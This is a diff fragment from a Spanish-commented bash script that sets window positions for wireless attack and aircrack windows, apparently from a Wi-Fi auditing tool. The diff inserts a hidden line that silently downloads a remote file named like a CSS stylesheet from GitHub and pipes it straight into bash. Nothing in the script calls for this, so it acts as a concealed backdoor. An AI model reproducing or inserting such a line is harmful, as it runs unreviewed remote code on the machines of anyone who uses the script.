@@ -139,7 +139,7 @@ ATAQUE5_VENTANA="-geometry 90x3-0+350"
 ATAQUE6_VENTANA="-geometry 90x3-0+420"
 ATAQUE7_VENTANA="-geometry 90x3-0+490"
 AIRCRACK_VENTANA="-geometry 70x23+0-0"
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 #CALCULAMOS LA RESOLUCIÓN DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xrandr" SE RECORTA DE UNA FORMA U OTRA
 which xdpyinfo > /dev/null 2>&1
 if [ $? -eq 0 ]
